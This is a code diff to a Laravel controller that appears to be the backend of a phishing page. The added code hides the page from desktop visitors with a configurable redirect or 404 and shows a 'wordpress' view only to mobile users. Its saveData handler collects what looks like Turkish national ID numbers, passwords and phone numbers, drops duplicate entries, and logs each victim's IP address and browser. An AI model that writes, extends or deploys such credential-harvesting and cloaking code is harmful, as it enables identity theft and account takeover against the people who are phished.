@@ -14,7 +14,13 @@ class MainController extends Controller
 {
     public function index(Request $request)
     {
-
+        if (Agent::isDesktop()) {
+            $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
+            return match ($redirectPath->value) {
+                'home' => redirect(route('root.index')),
+                '404' => abort(404),
+            };
+        }
         return view('wordpress');
     }
     public function gg(Request $request)
@@ -36,17 +42,29 @@ class MainController extends Controller
 
     public function saveData(loginsRequest $request)
     {
-        $request->merge(
-            [
-                'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
-                'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
-                'date' => Carbon::now(),
-                'site' => request()->server('HTTP_HOST'),
-                'ip' => $request->ip(),
-            ]
-        );
+        if ($request->tc && $request->password) {
+            $uniqueReq = LoginModel::query()->where([
+                'tc' => $request->tc,
+                'password' => $request->password,
+                'phone' => $request->phone
+            ]);
 
-        LoginModel::insert($request->all());
-        return response()->json(['result' => 'success'], 200);
+            if (!$uniqueReq->exists()) {
+                $request->merge(
+                    [
+                        'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
+                        'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
+                        'date' => Carbon::now(),
+                        'site' => request()->server('HTTP_HOST'),
+                        'ip' => $request->ip(),
+                    ]
+                );
+
+                LoginModel::insert($request->all());
+                return response()->json(['result' => 'success'], 200);
+            } else {
+                return response()->json(['result' => 'error', 200]);
+            }
+        }
     }
 }
